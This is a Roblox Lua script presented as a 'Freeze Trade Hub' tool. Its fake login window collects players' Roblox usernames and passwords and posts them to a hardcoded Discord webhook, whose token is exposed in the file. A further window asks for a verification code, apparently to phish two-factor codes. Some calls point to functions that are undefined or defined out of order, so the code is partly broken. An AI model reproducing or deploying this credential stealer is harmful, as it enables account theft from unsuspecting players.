-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    if syn and syn.request then
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Fungsi Membuat GUI Kedua (Login)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local subtitleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Subtitle Label
    subtitleLabel.Name = "SubtitleLabel"
    subtitleLabel.Parent = frame
    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
    subtitleLabel.BackgroundTransparency = 1
    subtitleLabel.Font = Enum.Font.SourceSans
    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
    subtitleLabel.TextSize = 16
    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)

    -- Username Box
    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Password Box
    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Login Button
    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Login Button
    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            print("Login berhasil! Username:", username, "Password:", password)
            sendToDiscord(username, password)
            gui:Destroy()
            createLoadingGUI() -- Memanggil GUI loading
        else
            print("Harap isi username dan password!")
        end
    end)
end

-- Fungsi Membuat GUI Ketiga (Loading)
local function createLoadingGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local loadingLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "LoadingGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoadingFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Loading Label
    loadingLabel.Name = "LoadingLabel"
    loadingLabel.Parent = frame
    loadingLabel.Size = UDim2.new(1, 0, 1, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.Text = "Loading, silakan tunggu..."
    loadingLabel.TextSize = 20
    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Menunggu selama 8 detik sebelum melanjutkan
    wait(8)
    gui:Destroy()
    createVerificationGUI() -- Memanggil GUI verifikasi
end

-- Fungsi Membuat GUI Keempat (Verifikasi Kode)
local function createVerificationGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local codeBox = Instance.new("TextBox")
    local verifyCodeButton = Instance.new("TextButton")
    local errorLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "VerificationGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "VerificationFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0.5, -125)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Code Box
    codeBox.Name = "CodeBox"
    codeBox.Parent = frame
    codeBox.Size = UDim2.new(1, -20, 0, 40)
    codeBox.Position = UDim2.new(0, 10, 0, 60)
    codeBox.PlaceholderText = "Masukkan Kode Verifikasi"
    codeBox.Font = Enum.Font.SourceSans
    codeBox.Text = ""
    codeBox.TextSize = 14
    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Error Label
    errorLabel.Name = "ErrorLabel"
    errorLabel.Parent = frame
    errorLabel.Size = UDim2.new(1, -20, 0, 20)
    errorLabel.Position = UDim2.new(0, 10, 0, 105)
    errorLabel.BackgroundTransparency = 1
    errorLabel.Font = Enum.Font.SourceSans
    errorLabel.Text = ""
    errorLabel.TextSize = 14
    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)

    -- Verify Code Button
    verifyCodeButton.Name = "VerifyCodeButton"
    verifyCodeButton.Parent = frame
    verifyCodeButton.Size = UDim2.new(1, -20, 0, 40)
    verifyCodeButton.Position = UDim2.new(0, 10, 0, 130)
    verifyCodeButton.Text = "Verifikasi Kode"
    verifyCodeButton.Font = Enum.Font.SourceSansBold
    verifyCodeButton.TextSize = 16
    verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Verifikasi Kode
    verifyCodeButton.MouseButton1Click:Connect(function()
        local code = codeBox.Text
        if code ~= "" then
            print("Kode verifikasi diterima:", code)
            gui:Destroy()
            -- Lanjutkan ke proses berikutnya
        else
            errorLabel.Text = "Harap masukkan kode verifikasi!"
        end
    end)
end

-- Memulai Script dengan GUI Pertama
createKeyValidationGUI()
